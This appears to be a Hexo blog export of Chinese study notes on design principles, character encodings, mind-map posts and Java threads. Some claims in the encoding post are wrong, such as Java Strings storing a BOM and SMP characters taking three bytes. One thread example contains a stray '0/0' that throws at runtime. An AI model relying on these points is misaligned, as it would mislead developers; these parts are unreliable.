<td>对扩展开放，对修改关闭</td>
<td>降低维护带来的新风险</td>
</tr>
<tr>
<td>依赖倒置原则</td>
<td>高层不应该依赖低层，要面向接口编程</td>
<td>更利于代码结构的升级扩展</td>
</tr>
<tr>
<td>单一职责原则</td>
<td>一个类只干一件事，实现类要单一</td>
<td>便于理解，提高代码的可读性</td>
</tr>
<tr>
<td>接口隔离原则</td>
<td>一个接口只干一件事，接口要精简单一</td>
<td>功能解耦，高聚合、低耦合</td>
</tr>
<tr>
<td>迪米特法则(最小认知原则)</td>
<td>不该知道的不要知道，一个类应该保持对其它对象最少的了解，降低耦合度</td>
<td>只和朋友交流，不和陌生人说话，减少代码臃肿</td>
</tr>
<tr>
<td>里氏替换原则</td>
<td>不要破坏继承体系，子类重写方法功能发生改变，不应该影响父类方法的含义</td>
<td>防止继承泛滥</td>
</tr>
<tr>
<td>合成复用原则</td>
<td>尽量使用组合或者聚合关系实现代码复用，少使用继承</td>
<td>降低代码耦合</td>
</tr>
</tbody></table>
<iframe src="https://www.xmind.net/embed/73pZXu" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>思维导图</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>中文编码与开发</title>
    <url>/2021/03/07/b688fb992b28/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>其实原本是想写一个 Java 脚本来帮我处理下载视频的名字更改，但是因为编码的问题让我非常生气，Windows 文件用 GBK 编码，再加上和 char 的 Unicode、String 的 byte[] 以及输入法输入的编码问题，直接把我搞蒙了，String 自带的一些方法用的云里雾里，能否正确全看玄学。为了能够一劳永逸的解决中文编码问题，于是此文就这样诞生了。</p>
</blockquote>
<h2 id="编码发展历史"><a href="#编码发展历史" class="headerlink" title="编码发展历史"></a>编码发展历史</h2><h3 id="ASCII-编码时代"><a href="#ASCII-编码时代" class="headerlink" title="ASCII 编码时代"></a>ASCII 编码时代</h3><p>最开始的开始，因为计算机发明在美国，所以计算机的字符是使用 ASCII 作为编码方式的，这让英语系国家们用的很开心，只需要 1 个字节就可以轻松的表示自己所有的字符，只占用 0-127，其中有 33 个控制字符，94 个可显字符。</p>
<p>后来，为了加入一些其他必要的符号，比如带重音的字母（法国人狂喜），希腊字母（希腊人狂喜），特殊的拉丁符号（罗马人狂喜），特殊的计算符号（科学家狂喜）等等等等。欧洲的发达国家开始打 ASCII 没有使用到的 128-255 这个区间的主意，出现了一堆各种各样的 EASCII 编码方式，即拓展 ASCII，用的比较多的有两个：OEM EASCII 和 ANSI EASCII 。</p>
<p>虽说扩展了整整一倍，但是因为所能表示的字符还是太少了，其他国家并不乐意，所以 EASCII 就很快的退出历史舞台，现在搜索 ASCII 一般搜索的都是 0-127 的初始版本。</p>
<h3 id="ANSI-编码时代"><a href="#ANSI-编码时代" class="headerlink" title="ANSI 编码时代"></a>ANSI 编码时代</h3><p>而非英语国家的人们为了使用计算机，也纷纷开始开发自己本国的文字编码方式，在 ANSI (American National Standards Institute) 的牵头下，各国的文字编码方式被 ANSI 承认之后，会作为该国文字的国际标准编码，叫作 ANSI 编码。 ANSI 编码是一种基于 ASCII 的变长编码，而且是固定的两个字节大小，前 128 个是 ASCII ，后面的是本国的文字。</p>
<p>虽然不同的国家都有了自己文字的编码方式也都快乐的用上了计算机，但各个文字的 ANSI 编码并不互通，导致了一种 ANSI 文字编码的文件里面不可以有其他国家的文字，否则就会乱码。</p>
<h4 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h4><p>中国显然也参与了这个过程中来，在 1980 年的时候，中国指定了汉字的 ANSI 编码：GB2312 即国标 2312 ，一共收录了 6763 个汉字，一级汉字 3755 个，二级汉字 3008 个，同时收录了包括拉丁字母、希腊字母、日文平假名及片假名字母、俄语西里尔字母在内的 682 个字符。这个字符集基本上覆盖了中国大陆 99.75% 的使用频率（因为繁体中文不在里面）。而 GB2312 的编码方式如下：</p>
<ul>
<li><p>GB2312 将稀少的两个字节分为了区字节（0xB0-0xF7 87个区）和位字节（0xA1-0xFE 94个位），用一个区字节和一个位字节结合起来来表示一个汉字。</p>
</li>
<li><p>之所以从 0x80 128 和 0xA1 161 开始表示区字节和位字节，就是为了照顾 ASCII 字符可以被单个字节表示，只要检测到字符大小小于 128 ，那么这就是一个 ASCII 字符，读取一个字节即可。如果大于等于 128，那么就说明这是一个汉字，读取两个字节，并按照组合出来的编号显示汉字。</p>
</li>
</ul>
<h4 id="GBK"><a href="#GBK" class="headerlink" title="GBK"></a>GBK</h4><p>但是，可怜的 GB2312 当时设置的比较草率，还有很多的空间没有使用，再加上 6763 个汉字真的是太少了，于是在 1995 年的时候，又搞了一个汉字的 ANSI 编码，叫作 GBK 编码，国(G)标(B)扩展(K)。这个 GBK 编码覆盖了 21886 个字符，增加了额外的汉字，繁体字，日文假名等等（但是不支持朝鲜字），现在还是 Windows 默认的文字编码方式。</p>
<ul>
<li>GBK 完全兼容 GB2312。并将位字节从 0x00 开始表示汉字，因为只要区字节大于 128 即可确定后面跟着的就是位字节而不是 ASCII，然后很好的利用了 GB2312 没有分配的空间，成功的容纳了绝大部分日常使用汉字。</li>
</ul>
<h4 id="GB18030"><a href="#GB18030" class="headerlink" title="GB18030"></a>GB18030</h4><p>但是，两个字节的极限就是容纳 2^16 个字符，是不可能容纳所有的汉字的，所以后来又改良 GBK 出来了一个 GB18030 ，这玩意终于将整个汉字+少数民族文字全部都编到了一起。</p>
<ul>
<li>GB18030 之所以能把中国所有的文字都搞到一起，是因为它最大长度是四个字节，其中一个字节和两个字节和 GBK 基本兼容。四个字节扩充了 6k+ 的字符，完成了汉字的所有收录（注意 GB18030 是没有三个字节的情况的）。</li>
</ul>
<h3 id="Unicode-时代"><a href="#Unicode-时代" class="headerlink" title="Unicode 时代"></a>Unicode 时代</h3><p>虽说 ANSI 解决了非英语国家使用计算机的问题，但是对于网上传输其他国家的文字，因为使用 ANSI 编码不同，会导致无法解析，比如韩国电脑解析不出来 GBK 编码的文字，打开直接乱码。</p>
<p>随着计算机存储元器件价格的大幅度下降和全球互联网的快速发展，统一文字编码方式让不同文字的展现无障碍越来越重要。为了将所有的文字都制定一个标准之中，让所有人都能解析所有文字，Unicode 字符集就诞生了，立志于给所有文字都编上号。最初版本的 Unicode 只有两个字节，而分给 CJK 系列字符的只有两万个，导致只有最常用的 CJK 字符才能被编写到 Unicode 里面，后来经过一段曲折与斗争，Unicode 终于扩展字节，发展成为了真正的万国码。</p>
<ul>
<li><p>现在 Unicode 字符集的空间规划是按照空间平面的方式进行的，为 0-16 平面，每个平面占用两个字节，可以表示 2^16 个字符。其中最初版本的 Unicode 表示的字符为 0 号平面，被称为 BMP <code>Basic Multilingual Plane</code> 基本语言平面，表示范围为：U+0000 到 U+FFFF，可以省略最前面的平面编号，占用两个字节。而剩下的字符都在辅助平面 SMP 上面，从 U+010000 一直到 U+10FFFF，占用三个字节。</p>
</li>
<li><p>基本上 BMP 就覆盖了世界上大多数语言的绝大多数使用情景，但是要明白的是 SMP 的产生，对于 CJK 国家来说意义重大。这意味着在通用的语言字符集里面，东亚文化可以完整的保留下来，一个汉字的不同书写、演化方式，各种生僻字，这些都是绝对不允许被科技的发展而被忽略和抛弃的。</p>
</li>
</ul>
<p>需要注意的是，Unicode 并不是一种编码方式，而是一个字符集，它只会给字符一个独一无二的编号，而不会规定这个字符如何在计算机种存储。规定如何在计算机中存储的是编码方式，如比较早的 UTF-16 编码，它使用两个字节或者四个字节来编码字符，对于 BMP 平面上的字符，使用两个字节，对于 SMP 平面上的字符，使用四个字节。</p>
<ul>
<li>UTF-16 中，两个字节和四个字节读取区分很简单，首先都按照两个字节读取，如果读取结果在 BMP 上面有实际的字符，那么就断定这是一个 BMP 字符。如果没有实际的字符，即 U+D800 到 U+DBFF（此区间为空区间），那么就四个字节连在一起读取，判断为 SMP 平面字符。四个字节一共保存了 2^20 位有效信息，对应着 16 个 2^16 个 SMP 字符。</li>
</ul>
<p>Unicode 并没有在英语系国家快速发展开来，因为他们的大量内容都是使用 ASCII 来编码的，UTF-16 不但不兼容 ASCII，还要让他们白白的多使用一个字节的空间来存储一个字符，于是基于 Unicode 字符集的新编码方式： UTF-8 就诞生了。</p>
<p>UTF-8 的最大特性就是可变字符长度，对于 ASCII 的字符，编码方式和 ASCII 相同，都只占用一个字节的空间。非 ASCII 的字符也根据 Unicode 编码占用 2-4 个字符，这样就不但不需要改变原来使用 ASCII 编码的信息，还符合和其他文字一起用的标准，并且能节省大量的空间。由于这些优良的特性，使得 UTF-8 编码快速成为了互联网上最流行的文字编码形式。</p>
<ul>
<li>UTF-8 规定，对于 ASCII 的字符，占用一个字节，开头标识为 0，后面 7 位存储数据。对于非 ASCII 字符，占用几个字节，那么第一位字节开头就有几个 1，用 0 标识结束，后面跟着的字节开头设为 10。比如三字节的汉字：1110XXXX 10XXXXXX 10XXXXXX 。</li>
</ul>
<h2 id="Windows-编码"><a href="#Windows-编码" class="headerlink" title="Windows 编码"></a>Windows 编码</h2><p>因为计算机的内存中需要使用固定长度来保存字符，所以使用了 Unicode 字符集的 UTF-16 来编码存储数据，而对于内容的存储，则会将内存中的 UTF-16 转化为 GBK/UTF-8/GB18030 这些编码方式然后保存，使用 UTF-16 一是因为当时最新的 Unicode 标准就是 UTF-16 ，其次是当时 UTF-16 定长编码，无论是什么数字，都是两个字节，对于在内存中快速定位非常方便（当然现在随着 Unicode 的扩充，UTF-16 还有四个字节的），使用 GBK/UTF-8/GB18030 存储是为了节省存储空间和方便网上传输。</p>
<p>在 Windows 里面，打开文档的时候，会将硬盘里面用 GBK/UTF-8/GB18030 存储的数据转化为 UTF-16 ，然后放进内存里。我们看到的东西其实都是存在于内存中的。互联网上的网页也是，返回请求的数据使用 UTF-8 编码，浏览器接收之后，会解码为 UTF-16 并放到内存中，然后才能展示给我们看。我们在复制显示的数据的时候，其实都是 UTF-16 编码，粘贴到文档里面的时候，也是将 UTF-16 编码转移到对应应用程序的内存区中，最后这个应用程序将数据保存到硬盘的时候，才会将内存的 UTF-16 数据转化为定义的保存编码格式。</p>
<p>所以根本不需要担心复制粘贴的可以看见的数据的编码问题，只要我们能看见（打开到了内存中），不是乱码，就全部都是正确的 UTF-16。我们唯一需要担心的是保存在硬盘里面的数据，因为不知道保存的时候是按照 GBK/UTF-8/GB18030 等等的哪种编码方式保存，所以打开的时候选择的解码方式，<strong>复制</strong>的时候也需要注意前后文件存储编码是否相同（因为直接复制文本，没有经过内存的 UTF-16 转化）。</p>
<h2 id="输入法原理"><a href="#输入法原理" class="headerlink" title="输入法原理"></a>输入法原理</h2><p>输入法作为一个应用程序，本质上还是向另外一个应用程序的内存中写入 UTF-16 编码，因为其他的应用程序用拿到的都是确定的 UTF-16 所以输入法输入时不需要担心编码问题的。</p>
<h2 id="Java-中的编码"><a href="#Java-中的编码" class="headerlink" title="Java 中的编码"></a>Java 中的编码</h2><p>在创造 Java 的时候，当时最流行的 Unicode 编码就是两个字节的 UTF-16，所以就给 Java 的 char 类型设置了两字节的空间，并使用 UTF-16 作为 char 类型的存储方式，所以 Char 只能标识 BMP 范围里面的字符。</p>
<p>对于 String 来说，同样是使用 UTF-16 作为编码方式，不过内部存储时使用 byte[] 而不是 char[]。这是因为以前使用 char[] 来实现 String 的时候，对于 SMP 的字符因为受 char 两个字节大小的制约而部分四字节编码无法显示，改为 byte[] 之后，就没有这个问题了，即使是四字节的 SMP 字符，一样可以很好的处理。</p>
<p>而<strong>最需要注意</strong>的是，String 保存的 UTF-16 格式的开头，会有一个 BOM byte-order mark 字节顺序标记，用一 0xff 和 0xfe 的顺序标识。0xfe 0xff 标识大端序（位数大的在左边，适合人阅读），反之标识小端序（位数小的在左边，适合计算机阅读）。我们平时处理获取的 UTF-16 编码一般来说是大端序，直接忽略最前面返回的 0xfe 和 0xff 两个字符即可。</p>
<p>而 JVM 打开 <code>.java</code> 文件进行编译运行的时候，会使用系统默认的编码方式打开文件，比如 Windows 存储中文到硬盘里面的默认编码方式就是 GBK，使用 Vscode 写的 UTF-8 编码的中文无法让 JVM 正确解码，就会出错。要么更改 VScode 保存编码为 GBK，要么编译加参数更改打开文件编码为 UTF-8。或者直接用 IDEA，保存打开方式都是 UTF-8，不存在编码问题。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>中文编码</tag>
      </tags>
  </entry>
  <entry>
    <title>Java函数式编程</title>
    <url>/2021/03/05/728260c40cfe/</url>
    <content><![CDATA[<h2 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h2><blockquote>
<p>搞了两天的函数式编程终于弄完了，也明白了这种设计方法和理念，下一步，Java 设计模式！</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/bvBmma" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>


]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>函数式</tag>
      </tags>
  </entry>
  <entry>
    <title>JDBC思维导图</title>
    <url>/2021/03/02/9a53fb3643d5/</url>
    <content><![CDATA[<h2 id="JDBC-思维导图"><a href="#JDBC-思维导图" class="headerlink" title="JDBC 思维导图"></a>JDBC 思维导图</h2><blockquote>
<p>在 JAVA 中，如何用代码和数据库进行交互呢？JDBC 告诉你答案！</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/y3kVuZ" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL基本语句思维导图</title>
    <url>/2021/03/02/726651d44320/</url>
    <content><![CDATA[<h2 id="SQL-基本语句思维导图"><a href="#SQL-基本语句思维导图" class="headerlink" title="SQL 基本语句思维导图"></a>SQL 基本语句思维导图</h2><blockquote>
<p>其实暑假学习安全的时候，就学过一部分 SQL 的相关语句，但是都忘了，好在有了前面的基础，很快就复习好了，并且完成了这个思维导图，感觉更清晰了一点。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/wB36P6" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>思维导图</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库概念思维导图</title>
    <url>/2021/03/02/8adb5d7ef601/</url>
    <content><![CDATA[<h2 id="MySQL-数据库概念思维导图"><a href="#MySQL-数据库概念思维导图" class="headerlink" title="MySQL 数据库概念思维导图"></a>MySQL 数据库概念思维导图</h2><blockquote>
<p>还是要了解一下什么是数据库才好啊！！！</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/eZ6P3x" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>


]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>思维导图</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络基础思维导图【一】</title>
    <url>/2021/02/21/ffb6e1744ad2/</url>
    <content><![CDATA[<h2 id="计算机网络基础思维导图"><a href="#计算机网络基础思维导图" class="headerlink" title="计算机网络基础思维导图"></a>计算机网络基础思维导图</h2><blockquote>
<p>思维导图主要介绍了和计算机网络相关的一些基本概念，以及介绍了一些非常基础的计算机通信的过程。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/ccBMp4" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>
]]></content>
      <categories>
        <category>计算机体系</category>
      </categories>
      <tags>
        <tag>思维导图</tag>
        <tag>计算机网络</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的XML和JSON思维导图</title>
    <url>/2021/02/21/ea621b64d07c/</url>
    <content><![CDATA[<h2 id="数据文档思维导图"><a href="#数据文档思维导图" class="headerlink" title="数据文档思维导图"></a>数据文档思维导图</h2><blockquote>
<p>思维导图主要介绍了两种数据文档 XML 和 JSON 在 Java 中的数据解析方法。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/rc4VPM" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>XML</tag>
        <tag>JSON</tag>
      </tags>
  </entry>
  <entry>
    <title>Java网络编程思维导图</title>
    <url>/2021/02/21/4766679f53f7/</url>
    <content><![CDATA[<h2 id="网络编程思维导图"><a href="#网络编程思维导图" class="headerlink" title="网络编程思维导图"></a>网络编程思维导图</h2><blockquote>
<p>主要记录了使用 Java 实现服务端和客户端之间进行 TCP 协议和 UDP 协议之间通信的方法。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/QXFXMQ" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的Maven基础思维导图</title>
    <url>/2021/02/21/21924715f1a8/</url>
    <content><![CDATA[<h2 id="Maven基础思维导图"><a href="#Maven基础思维导图" class="headerlink" title="Maven基础思维导图"></a>Maven基础思维导图</h2><blockquote>
<p>思维导图主要介绍了 Maven 的一些基本使用方法。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/eyFDrU" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Java加密与安全思维导图</title>
    <url>/2021/02/21/1b4cc7a4e155/</url>
    <content><![CDATA[<h2 id="加密与安全思维导图"><a href="#加密与安全思维导图" class="headerlink" title="加密与安全思维导图"></a>加密与安全思维导图</h2><blockquote>
<p>思维导图主要记录了使用 Java 对数据进行各种加密解密的方法。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/yVNPMU" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>加密与安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java正则表达式思维导图</title>
    <url>/2021/02/21/1521f5df53d5/</url>
    <content><![CDATA[<h2 id="正则表达式思维导图"><a href="#正则表达式思维导图" class="headerlink" title="正则表达式思维导图"></a>正则表达式思维导图</h2><blockquote>
<p>思维导图主要记录了一下正则表达式的一些简单的使用方法。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/cFDKCv" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Java单元测试思维导图</title>
    <url>/2021/02/21/4555c3a37b23/</url>
    <content><![CDATA[<h2 id="单元测试思维导图"><a href="#单元测试思维导图" class="headerlink" title="单元测试思维导图"></a>单元测试思维导图</h2><blockquote>
<p>思维导图主要介绍了如何使用 Junit 测试框架对代码进行测试。大概和 OI 中的测评差不多。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/9sFrRD" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Java日期与时间思维导图</title>
    <url>/2021/02/21/7e7fe64348b1/</url>
    <content><![CDATA[<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><blockquote>
<p>emmmm，因为自己是一只老懒狗了，发现完整的写博客真的是非常消耗时间的行为，所以想了想就改为只完成知识点的思维导图。这样的话花在记录的时间能减少很多，而且效果也非常接近，以后各种知识点大概都会以这样的方式来记录了！</p>
</blockquote>
<h2 id="旧版本的日期和时间思维导图"><a href="#旧版本的日期和时间思维导图" class="headerlink" title="旧版本的日期和时间思维导图"></a>旧版本的日期和时间思维导图</h2><blockquote>
<p>此思维导图记录了早期 Java 使用的日期和时间类，现在部分地方仍在使用，所以需要学习。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/KfjibH" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>

<h2 id="新版本的日期和时间思维导图："><a href="#新版本的日期和时间思维导图：" class="headerlink" title="新版本的日期和时间思维导图："></a>新版本的日期和时间思维导图：</h2><blockquote>
<p>此思维导图是新版本的日期和时间类，相较于过去的类更加好用了。</p>
</blockquote>
<iframe src="https://www.xmind.net/embed/isNRTN" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>思维导图</tag>
        <tag>日期与时间</tag>
      </tags>
  </entry>
  <entry>
    <title>Java多线程学习笔记</title>
    <url>/2021/02/21/575347381561/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="线程和进程"><a href="#线程和进程" class="headerlink" title="线程和进程"></a>线程和进程</h3><p><strong>线程</strong>：<code>Thread</code>，是操作系统中能够进行任务调度的最小单位，一般来说是一条单独的任务，比如 bilibili 的视频解码器是一个线程，音频解码器是一条线程，弹幕显示器是一条线程，它们被一起包装在 bilibili 这个进程中，作为正在运行的应用程序。因此线程指的是进程中的一个单一顺序的控制流，一个进程中可以有多条线程，每条线程执行不同的任务。</p>
<p><strong>进程</strong>：<code>Process</code>， 是指计算机中运行的程序，直观体现是任务管理器中的一个个进程，进程本身不是基本运行单位，而是线程的容器，多个运行不同的线程组成了一个进程。而一个 Java 程序就是一个 JVM 进程，这个 JVM 进程中，主线程执行 main() 方法，而在 main() 线程中，又可以调用其他的线程实现多线程。</p>
<h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><p><strong>并发</strong>：<code>Concurrent</code>，是指计算机能够具备处理多个任务的能力，反义词是顺序。顺序执行时只能在执行完一个任务之后才能执行第二个任务，而并发可以“同时”执行多个任务，无论这个是通过将多个大任务分为一个个小任务，然后快速切换执行不同大任务的小任务运行实现的“同时”执行，还是真正的用两个处理器核心，不同核心专注执行不同任务实现的同时执行。两种方法都被成为并发。</p>
<p><strong>并行</strong>：<code>parallel</code> ，是指计算机真正意义上的同时处理两个任务，这在物理基础上需要 CPU 的两个单独的核心，然后使得两个任务的不同执行在同一时间在不同的核心上面被执行。并行是并发的一种情况（上面实现并发的第二种方法就是并行）。</p>
<h3 id="线程调度"><a href="#线程调度" class="headerlink" title="线程调度"></a>线程调度</h3><p><strong>分时调度</strong>：所有的线程轮流使用 CPU 的使用权，平均分配每个线程占用 CPU 的时间。</p>
<p><strong>抢占式调度</strong>：根据优先度来分配线程的使用时间，优先度高的占用时间长，Java 采用此机制。</p>
<h3 id="两者的特点"><a href="#两者的特点" class="headerlink" title="两者的特点"></a>两者的特点</h3><p>对于一个复杂的应用程序，肯定是需要实现并发，也就是不同的小任务同时执行，比如 bilibili 的弹幕任务，视频解码任务和音频解码任务等。这些小任务的同时运行实现方法就是多个进程或者线程之间并发，亦或者两者一起。</p>
<p>创建一个进程的开销要比创建一个线程开销大很多，而且一个进程内部的多个线程之间的通信 开销很小（因为访问的是同一个变量），进程与进程之间的的通信开销就要大很多。</p>
<p>正是因为进程之间有一定的隔离，所以稳定性比多线程好很多。多个进程之间崩溃是互不影响的，而一个进程里面的线程一旦崩溃，这个进程中的所有线程都要受到影响。</p>
<h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><h3 id="main-线程"><a href="#main-线程" class="headerlink" title="main 线程"></a>main 线程</h3><p>在一个 Java 程序被执行的时候，是从 main 函数开始执行的，而 main 函数被执行的时候就是一个单独的线程，它的名字就叫做 main 线程。</p>
<p>首先 main 函数的代码会被放到内存的栈空间中，然后将这个空间和 CPU 建立一个桥梁，CPU 可以通过此桥梁读取此内存空间中的数据和指令，然后执行它。而这个桥梁就是线程，名字为 main 线程。</p>
<p>在执行 main 线程的时候，main 函数可能有创建一个新的线程的代码，当 CPU 运行 main 线程到此部分的时候，就会按照线程指令执行，开辟一个新的内存空间，放入数据和指令，然后建立一个自己到这个空间的桥梁命名为 func1 线程，用来读取数据和执行放入的指令。这就成功的在 JVM 进程的 main 线程中新建了第二个线程 func1 到此进程中，实现了多线程。</p>
<p>这个两个线程组成的多线程是可以实现并发的，也就是两个线程 main 和 func1 的任务可以“同时”运行。这是单独一个线程无法实现的，单独一个线程只能顺序执行里面的指令。</p>
<h3 id="线程建立过程"><a href="#线程建立过程" class="headerlink" title="线程建立过程"></a>线程建立过程</h3><h4 id="方法一：继承Thread"><a href="#方法一：继承Thread" class="headerlink" title="方法一：继承Thread"></a>方法一：继承Thread</h4><p>建立一个新的线程的方法就是新建一个类，继承于 Thread 类。然后在子类中重写 Thread 类里的 run() 方法，这个方法里面是需要新线程同步执行的代码。然后调用子类实例的 start() 方法，就成功的建立了一个新的线程，此线程和 main 线程并发执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread Xorex=<span class="keyword">new</span> WorkTogether(<span class="string">&quot;The Second Thread.&quot;</span>);</span><br><span class="line">        Xorex.start();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WorkTogether</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WorkTogether</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x=<span class="number">0</span>/<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Tempest&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码就是新建了一个继承于 <code>Thread</code> 的线程类 <code>WorkTogether</code>，然后建立一个名为 <code>The Second Thread.</code> 的线程，通过 <code>start()</code> 的调用开始并发执行此线程的 <code>run()</code> 方法和 main 线程 后面的代码 。</p>
<p>程序运行的结果就是 Tempest 和 Xorex 两个字符串随机被打印出来，因为是并发，所以可以看作两个循环在“同时”运行，至于某一个细小的时间段具体是在运行谁，则完全由 CPU 随机决定。两个线程的运行是互不干扰的，因为建立一个新的线程的时候，就会开辟一块新的栈空间，因为内存空间不同，则运行相互独立。</p>
<p>如果我们不调用新线程类实例的 <code>start()</code> 方法而是直接调用 <code>run()</code> 方法，则不会启动新线程，而是把 <code>run()</code> 方法代码压栈到 main 线程的栈空间中，在 main 线程中顺序执行 <code>run()</code> 方法，执行完毕之后，再执行后面的代码而不是一起并发运行。</p>
<h4 id="方法二：传入Runnable"><a href="#方法二：传入Runnable" class="headerlink" title="方法二：传入Runnable"></a>方法二：传入Runnable</h4><p>Runnable 是一个接口，实现这个 Runnable 接口只需要重写一个 run() 类，和继承 Thread 的重写 run() 几乎相同，不同的是 ，这里实现了线程和执行内容的分离。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Thread</span><span class="params">(Runnable target)</span></span>;</span><br></pre></td></tr></table></figure>
<p>直接在 Thread 的构造方法中，传入一个实现了 Runnable 的类的实例即可，然后调用 Thread 实例的 start() 方法启动并运行线程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread Xorex=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;This is an another thread!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Xorex.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
